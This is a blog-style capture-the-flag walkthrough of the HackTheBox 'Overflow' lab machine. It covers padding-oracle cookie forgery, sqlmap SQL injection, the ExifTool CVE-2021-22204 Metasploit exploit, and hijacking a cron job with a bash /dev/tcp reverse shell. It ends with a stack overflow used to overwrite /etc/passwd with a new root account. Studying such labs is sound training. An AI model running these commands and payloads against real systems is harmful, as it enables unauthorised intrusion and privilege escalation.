---
layout: post
title: "Overflow (Hard) — HackTheBox Walkthrough"
date: 2021-11-17
categories: [CTF]
tags: [hackthebox, padding-oracle, sql-injection, cve-2021-22204, exiftool, buffer-overflow, reverse-engineering, privilege-escalation]
description: "Full walkthrough of HackTheBox's Overflow (Hard) machine — covering padding oracle attack, SQL injection, CVE-2021-22204 (ExifTool), DNS hijacking for lateral movement, and a buffer overflow for root."
---

**Difficulty:** Hard | **Platform:** HackTheBox | **OS:** Linux

The Overflow machine is a great end-to-end box that chains together a padding oracle attack, SQL injection, an ExifTool CVE, lateral movement via DNS hijacking, and a buffer overflow to reach root. Each step builds logically on the last.

## Enumeration

### nmap

Starting with a full TCP scan:

```
$ nmap -p- -A -oA overflow overflow

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Overflow Sec
```

UDP scan revealed nothing interesting (only DHCP on 68/udp).

Ports of interest: **22 (SSH)**, **25 (SMTP)**, **80 (HTTP)**.

## Web Enumeration

Browsing to port 80 shows a site called "Overflow Sec." Trying `admin:admin` failed. I registered a new account (`groovy:groovy`) and was granted access to a static profile and blog page.

### Directory Brute Force

```
$ dirb http://overflow/home -X .php -o tcp_80_http_dirb_home_php.txt

+ http://overflow/home/blog.php     (CODE:200|SIZE:2971)
+ http://overflow/home/index.php    (CODE:302|SIZE:12503)
+ http://overflow/home/logs.php     (CODE:200|SIZE:14)
```

```
$ dirb http://overflow/config/ /usr/share/wordlists/dirb/big.txt -X .php

+ http://overflow/config/auth.php   (CODE:200|SIZE:0)
+ http://overflow/config/db.php     (CODE:200|SIZE:0)
+ http://overflow/config/users.php  (CODE:200|SIZE:0)
```

`logs.php` was new — accessing it returned "Unauthorized."

## Padding Oracle Attack

Examining request headers after login revealed an `auth` cookie:

```
Cookie: auth=TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E
```

Attempting to decode the value provided nothing useful. When modifying the cookie (adding/removing characters), the server returned a `302` redirect — a classic indicator of CBC cipher validation, which is exploitable via a **Padding Oracle Attack**.

### Reference
A great intro: [https://pentesterlab.com/exercises/padding_oracle/course](https://pentesterlab.com/exercises/padding_oracle/course)

### Decrypting the Cookie with padbuster

```
$ sudo apt install padbuster

$ padbuster http://overflow/home/index.php TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E 8 \
  -cookies auth=TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E -encoding 0
```

The tool identified two response signatures — chose option `2` (recommended), which corresponded to the error condition (`logout.php?err=1`).

Result:

```
[+] Decrypted value (ASCII): user=groovy
```

Now that we know the plaintext format is `user=<username>`, we can forge a cookie for admin:

```
$ padbuster http://overflow/home/index.php TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E 8 \
  -cookies auth=TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E -encoding 0 -plaintext "user=Admin"

[+] Encrypted value is: BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA
```

Setting a Burp match-and-replace rule to inject this cookie value unlocked the admin panel.

## SQL Injection via logs.php

The admin panel revealed a `logs.php` endpoint that appeared blank. Looking at the page source, a JavaScript file referenced:

```javascript
let url = 'http://overflow.htb/home/logs.php?name=admin';
```

The `name` parameter — tested with sqlmap — was vulnerable:

```
$ sqlmap -u http://overflow.htb/home/logs.php?name= \
  --cookie auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA

Parameter: name (GET)
  Type: time-based blind
  Type: UNION query (NULL) - 3 columns
```

### Dumping Password Hashes

Enumerating databases revealed `cmsmsdb`. Dumping the users table:

```
Database: cmsmsdb
Table: cms_users

| user_id | username | password                         |
|---------|----------|----------------------------------|
| 1       | admin    | c6c6b9310e0e6f3eb3ffeb2baff12fdd |
| 3       | editor   | e3d748d58b58657bfa4dffe2def0b1c7 |
```

The salt (needed for CMS Made Simple's MD5+salt scheme) was pulled from `cms_siteprefs`:

```
| sitemask | 6c2d17f37e226486 |
```

Repurposed the [CMS Made Simple SQL Injection exploit](https://www.exploit-db.com/exploits/46635) to crack the hashes using the extracted salt. The admin hash didn't crack, but:

```
editor : alpha!@#$%bravo
```

Logging into the CMS admin panel with `editor:alpha!@#$%bravo` worked.

## Initial Shell — CVE-2021-22204 (ExifTool)

The CMS revealed a second hostname in the admin panel tags. Adding it to `/etc/hosts` and browsing to it, I was able to log in with the editor credentials.

The profile page had an upload function. Direct PHP webshell upload was blocked (unsupported filetype). Examining the HTTP response, I noticed an `exiftool` output in the body — version `11.92`.

ExifTool 11.92 is vulnerable to **CVE-2021-22204** (DjVu ANT Perl injection). Metasploit has a module for this:

```
msf6 > use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
msf6 > set LHOST 10.10.14.124
msf6 > set LPORT 80
msf6 > run

[+] msf.jpg stored at /home/kali/.msf4/local/msf.jpg
```

With a listener running (`penelope 80`), uploading `msf.jpg` triggered the reverse shell:

```
[+] Got reverse shell from overflow~10.129.96.28
www-data@overflow:~/devbuild-job/home/profile$
```

## Lateral Movement — developer

Looking through the web directories:

```
$lnk = mysqli_connect("localhost","developer", "sh@tim@n","Overflow");
```

`db.php` contained credentials for the `developer` user. SSH in:

```
$ ssh developer@overflow.htb
# password: sh@tim@n
```

Still couldn't read `user.txt` (owned by `tester`).

## Lateral Movement — tester (DNS Hijacking)

Inspecting `/opt`:

```
developer@overflow:/opt$ cat commontask.sh
#!/bin/bash
# make sure its running every minute.
bash < <(curl -s http://taskmanage.overflow.htb/task.sh)
```

The script runs every minute as `tester`, fetching and executing a shell script from `taskmanage.overflow.htb`. That subdomain doesn't exist — we can hijack it.

Add `taskmanage.overflow.htb` pointing to our attacker IP in the target's `/etc/hosts`. Host a reverse shell payload:

```
$ echo "bash -i >& /dev/tcp/10.10.14.124/4444 0>&1" > task.sh
$ python3 -m http.server 80
```

Within a minute, the cron fetches our script and we get a shell as `tester`:

```
tester@overflow:~$ cat user.txt
fecfbe48b22a868e2a836daf78dfcca8
```

Upgraded to a stable SSH session by generating a keypair on the target and copying the private key back.

## Privilege Escalation — root (Buffer Overflow)

`/opt/file_encrypt/` was now accessible:

```
tester@overflow:/opt/file_encrypt$ ./file_encrypt
This is the code 1804289383. Enter the Pin: test
Wrong Pin
```

### Reversing the PIN with Ghidra

After SCP'ing the binary back to my machine, Ghidra decompilation revealed the `check_pin` and custom `random()` functions.

The PIN validation compares user input against the result of `random()`:

```c
void check_pin(void) {
  int local_18;       // our input
  long local_14;      // generated PIN

  local_10 = rand();
  local_14 = random();  // custom function
  printf("This is the code %i. Enter the Pin: ", local_10);
  scanf(&DAT_00010d1d, &local_18);
  if (local_14 == local_18) {
    printf("name: ");
    scanf(&DAT_00010c63, local_2c);  // vulnerable scanf — no length limit
  }
}
```

The custom `random()` function:

```c
long random(void) {
  uint local_c = 0x6b8b4567;
  int local_8 = 0;
  while (local_8 < 10) {
    local_c = local_c * 0x59 + 0x14;
    local_8++;
  }
  return local_c ^ in_stack_00000004;  // XOR with initial value
}
```

Using `gdb` to set a breakpoint at `random+57` (the XOR instruction), I examined `ebp+8` and confirmed the XOR key equals the initial `local_c` value (`0x6b8b4567`).

**PIN generator script:**

```python
#!/usr/bin/python3
import ctypes

local_c_initial = 0x6b8b4567
local_c = 0x6b8b4567
local_8 = 0

while local_8 < 10:
    local_c = local_c * 0x59 + 0x14
    local_8 += 1

PIN = ctypes.c_int(local_c ^ local_c_initial).value
print("The PIN code is:", PIN)
```

```
$ python3 generate_pin.py
The PIN code is:  -202976456
```

### Exploiting the Buffer Overflow

The `name` field in `check_pin` uses `scanf` with no length restriction into a 20-byte buffer — classic stack overflow. Confirmed by passing 100+ `A`s and seeing a segfault at `0x41414141`.

Using `msf-pattern_create` and `msf-pattern_offset`, the EIP offset is **44 bytes**.

Target: the `encrypt` function (which reads a file and XOR-encrypts it to an output path). Disassembling in gdb:

```
encrypt starts at: 0x5655585b
```

**Exploit payload:**

```python
python -c "print('\x41' * 44 + '\x5b\x58\x55\x56')"
```

This overwrites EIP with the address of `encrypt`, which accepts input/output file paths.

### Getting root

The `encrypt` function XOR-encrypts files with key `0x9b`. The trick: XOR is its own inverse — if we pre-encrypt our modified `/etc/passwd`, running it through `encrypt` decrypts it back to plaintext when writing to `/etc/passwd`.

```bash
tester@overflow:~$ cp /etc/passwd /tmp/passwd
tester@overflow:~$ echo 'root2:KWi2XW05LmkMg:0:0:root:/root:/bin/bash' >> /tmp/passwd
```

Pre-encrypt the modified passwd file (XOR each byte with `0x9b`), then run the exploit to call `encrypt` with input `/tmp/passwd_encrypted` → output `/etc/passwd`.

```
root@overflow:~# cat root.txt
7bd0f1da4f887e9ceb4f4f9c6e3f8171
```

## Summary

| Step | Technique |
|------|-----------|
| Foothold recon | nmap, dirb |
| Cookie forgery | CBC Padding Oracle (padbuster) |
| Credential dump | SQL injection (sqlmap), MD5+salt cracking |
| Initial shell | CVE-2021-22204 ExifTool DjVu injection |
| User 1 → User 2 | Plaintext credentials in db.php |
| User 2 → User 3 | DNS hijacking + cron job |
| User 3 → root | Buffer overflow + file encryption XOR trick |
